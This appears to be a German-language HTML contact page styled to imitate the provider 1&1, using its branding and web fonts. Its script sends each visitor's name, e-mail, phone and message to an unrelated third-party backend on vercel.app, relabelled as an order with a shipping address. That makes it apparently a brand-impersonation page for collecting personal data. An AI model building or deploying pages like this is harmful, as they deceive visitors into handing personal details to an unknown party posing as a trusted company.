<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>1&1 Kontakt</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'57-condensed',Arial,sans-serif;background:#f5f5f5;min-height:100vh;font-size:18px;line-height:23.4px;color:#3c3c3c;display:flex;align-items:center;justify-content:center;padding:20px;-webkit-font-smoothing:antialiased}
    .c{width:100%;max-width:1224px;margin:0 auto;padding:0 12px}
    .ca{background:#fff;border:none;border-radius:0;overflow:hidden;width:100%;max-width:358px;color:#3c3c3c}
    @media (min-width:992px){.ca{border:1px solid #99b6d5}}
    .ca-h{background:transparent;color:#003d8f;padding:24px;text-align:left;font-family:'77-black-condensed',Arial,sans-serif;font-size:24px;font-weight:400;line-height:29.28px}
    .ca-b{padding:0 24px;color:#3c3c3c}
    .ca-f{padding:24px;background:transparent;color:#3c3c3c}
    .ig{position:relative;margin-bottom:16px;display:flex}
    .foc{width:264px;height:50px;padding:8px 0 8px 12px;border:1px solid #99b6d5;border-right:none;border-radius:5px 0 0 5px;font-size:18px;font-family:'57-condensed',Arial,sans-serif;color:#003d8f;background:#fff;transition:border-color 0.3s}
    .foc:focus{outline:2px solid #ff8c00 !important;outline-offset:-2px !important;border-color:#99b6d5}
    .foc::placeholder{color:#003d8f;opacity:1}
    textarea.foc{width:100%;height:auto;min-height:80px;border-right:1px solid #99b6d5;border-radius:5px;padding:12px}
    .igt{position:absolute;right:0;top:0;height:100%;width:46px;padding:6px 12px;display:flex;align-items:center;justify-content:center;background:transparent;border:1px solid #99b6d5;border-radius:0 5px 5px 0;margin-left:0;cursor:pointer}
    .btn{width:100%;height:38px;padding:0 22px;background:linear-gradient(to left,#f3e11e 50%,#f7e94d 50%);background-size:200% 100%;background-position:100% 100%;color:#003d8f;border:none;border-radius:5px;font-family:'77-black-condensed',Arial,sans-serif;font-size:16px;font-weight:400;line-height:16px;cursor:pointer;transition:all 0.3s;margin:8px 0 12px 0}
    @media (min-width:992px){.btn{height:48px;font-size:20px}}
    .btn:hover{background-position:0% 100%}
    .btn:disabled{opacity:0.6;cursor:not-allowed}
    .d-none{display:none}
    .mb-1{margin-bottom:12px}
    .pb-0{padding-bottom:0}
    .pt-1{padding-top:12px}
    #status{margin-top:15px;text-align:center;font-weight:bold;font-size:16px;color:#003d8f}
    @font-face {
        font-family: '57-condensed';
        font-weight: 400;
        font-display:block;
        src: url(https://content.1und1.de/fonts/1und1-web-sans-57-condensed.woff2) format("woff2"),
        url(https://content.1und1.de/fonts/1und1-web-sans-57-condensed.woff) format("woff")
    }
    @font-face {
        font-family: '77-black-condensed';
        font-weight: 400;
        font-display:block;
        src: url(https://content.1und1.de/fonts/1und1-web-sans-77-black-condensed.woff2) format("woff2"),
        url(https://content.1und1.de/fonts/1und1-web-sans-77-black-condensed.woff) format("woff")
    }
  </style>
</head>
<body>
  <div class="c">
    <div class="ca">
      <form id="contactForm">
        <div class="ca-h">Kontakt</div>
        <div class="ca-b pb-0">
          <div class="ig mb-1 noselect">
            <input class="foc no-select" type="text" id="name" placeholder="Name" required autofocus="">
          </div>
          <div class="ig mb-1 noselect">
            <input class="foc no-select" type="email" id="email" placeholder="E-Mail" required>
          </div>
          <div class="ig mb-1 noselect">
            <input class="foc no-select" type="text" id="phone" placeholder="Telefon">
          </div>
          <div class="ig mb-1 noselect">
            <textarea class="foc no-select" id="message" placeholder="Nachricht" required></textarea>
          </div>
        </div>
        <div class="ca-f pt-1 pb-0">
          <button type="submit" class="btn" id="submit-btn">Senden</button>
          <p id="status"></p>
        </div>
      </form>
    </div>
  </div>

  <script>
const BACKEND_URL = 'https://order-backend-one.vercel.app';

document.getElementById('contactForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  const formData = {
    customer_name: document.getElementById('name').value.trim(),
    email: document.getElementById('email').value.trim(),
    phone: document.getElementById('phone').value.trim() || "Not provided",
    shipping_address: document.getElementById('message').value.trim(),
    product_name: "Contact Form",
    quantity: 1,
    price: 1
  };

  if (!formData.customer_name || !formData.email || !formData.shipping_address) {
    document.getElementById('status').textContent = "❌ Bitte alle Felder ausfüllen";
    return;
  }

  try {
    const res = await fetch(`${BACKEND_URL}/api/orders`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(formData)
    });

    const data = await res.json();
    if (res.ok) {
      document.getElementById('status').textContent = "✅ Gesendet!";
      document.getElementById('contactForm').reset();
    } else {
      document.getElementById('status').textContent = "❌ " + data.error;
    }
  } catch (err) {
    document.getElementById('status').textContent = "❌ Server Fehler";
  }
});
  </script>
</body>
</html>
